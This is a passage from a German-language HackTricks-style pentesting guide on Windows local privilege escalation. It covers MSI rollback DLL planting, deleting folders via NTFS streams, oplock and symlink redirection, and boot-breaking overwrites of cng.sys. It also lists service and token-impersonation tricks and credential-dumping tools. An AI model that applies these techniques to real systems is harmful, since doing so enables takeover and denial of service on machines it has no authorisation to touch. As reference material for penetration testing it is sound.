        - `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` einliest.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - Danach wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACLs erneut anwenden
    - Nachdem das Ereignis „`.rbs created`“ eingegangen ist:
        - wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du jedoch weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, du kannst also weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (eine schädliche DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **schädlichen DLL-Nutzlast auf SYSTEM-Ebene** ab.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass die Installation an einem bekannten Punkt **absichtlich fehlschlägt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine schädliche `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielpfad.
    - Jetzt befindet sich deine **schädliche DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** (z. B. `osk.exe`) aus, die die von dir gehijackte DLL lädt.
    - **Bumm**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM-EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Doch was, wenn deine Schwachstelle nur das **Löschen beliebiger Dateien** erlaubt?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Du kannst dies mit Standard-APIs zum Löschen von Dateien tun, wie etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Auch wenn du eine API zum Löschen einer *Datei* aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen von Ordnerinhalten zu SYSTEM-EoP
Was, wenn deine Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei erstellen
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **hält die Ausführung an**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **Junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, in dem Ordner-Metadaten gespeichert werden — wird dieser gelöscht, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aufgrund der Junction und des Symlinks löscht er jetzt tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung eines beliebigen Ordners zu einem permanenten DoS

Nutze eine Primitive, mit der du **als SYSTEM/admin einen beliebigen Ordner erstellen** kannst – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie **ihn vorab als Ordner erstellen**, kann Windows beim Booten den eigentlichen Treiber nicht laden.
- Anschließend versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Datenträgerzugriff).

### Von privilegierten Log-/Backup-Pfaden und OM-Symlinks zum beliebigen Dateiüberschreiben / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, leiten Sie diesen Pfad mit **Object Manager-Symlinks + NTFS-Mount-Points** um, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben umzuwandeln (sogar **ohne SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. wenn ein Admin „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Existiert jedoch eine Kopie in `C:\Windows\System32\cng.sys`, kann diese zuerst geladen werden, wodurch sie sich zuverlässig als Ziel für beschädigte Daten eignet.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem Prozess mit High Integrity ausgeführt wirst, kann der **Weg zu SYSTEM** einfach sein: Erstelle und starte einfach einen neuen Dienst.

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Dienst-Binary darauf, dass sie ein gültiger Dienst ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Dienst ist.

### AlwaysInstallElevated

Aus einem Prozess mit hoher Integrität könntest du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und mithilfe eines _**.msi**_-Wrappers eine Reverse Shell zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Den** [**Code findest du hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du über diese Token-Privilegien verfügst (wahrscheinlich findest du sie in einem Prozess mit bereits hoher Integrität), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (außer geschützte Prozesse), das **Token** des Prozesses **kopieren** und mit diesem Token einen **beliebigen Prozess erstellen**.\
Bei dieser Technik wird üblicherweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Privilegien ausgeführt wird** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Privilegien_).\
**Ein** [**Codebeispiel, das die vorgeschlagene Technik ausführt, findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter für die Rechteausweitung in `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Dienst erstellt oder missbraucht, um in diese Pipe zu schreiben**. Der **Server**, der die Pipe erstellt hat, kann mithilfe des **`SeImpersonate`**-Privilegs das **Token des Pipe-Clients** (des Dienstes) imitieren und so SYSTEM-Privilegien erhalten.\
Wenn du [**mehr über Name Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie du mithilfe von Name Pipes von hoher Integrität zu System wechselst, solltest du dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **hijacken**, die von einem als **SYSTEM** ausgeführten **Prozess geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Dll Hijacking ist daher auch für diese Art der Rechteausweitung nützlich. Außerdem ist es **aus einem Prozess mit hoher Integrität wesentlich einfacher**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner hat.\
**Hier kannst du** [**mehr über Dll hijacking erfahren**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Bestes Tool zur Suche nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldedaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt einen Spray-Angriff mit gesammelten Passwörtern über die Domäne aus**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-Tool zum Spoofing von ADIDNS/LLMNR/mDNS und für Man-in-the-Middle-Angriffe.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung für Rechteausweitungen**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Rechteausweitungs-Schwachstellen (VERALTET, stattdessen Watson verwenden)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Rechteausweitungs-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als für Rechteausweitungen) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldedaten aus vielen Programmen (vorkompilierte exe auf github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (vorkompilierte ausführbare Datei auf github). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (es benötigt kein accesschk, um ordnungsgemäß zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilegien durch Ausnutzen schwacher Ordnerberechtigungen erhöhen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Windows-/Linux-Workshop zu lokaler Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – Umfassender OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-Checkliste](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Methoden zur Windows Privilege Escalation für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → hMailServer-Anmeldedaten entschlüsseln → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-Leak + Stack-BOF → VirtualAlloc-ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel im Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Sicherheitslücke im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Zurück in die Vergangenheit: Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – C/C++-Checklistenaufgaben, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: CLDFLT- und DirectX-Kernel-Race-Conditions für Windows-LPE verketten](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O-Ring, sie alle zu beherrschen: Eine vollständige Read/Write-Exploit-Primitiv unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen missbrauchen, um Privilegien auszuweiten und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – FilesystemEoPs-Exploit-Code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388-PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource-Based Constrained Delegation: Wenn eine Imageänderung zu einer Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – SSH-Private-Keys aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM nachvollziehen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – Sicherheitshinweis zur Privilege Escalation durch Offsets im gemeinsam genutzten Speicher von Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
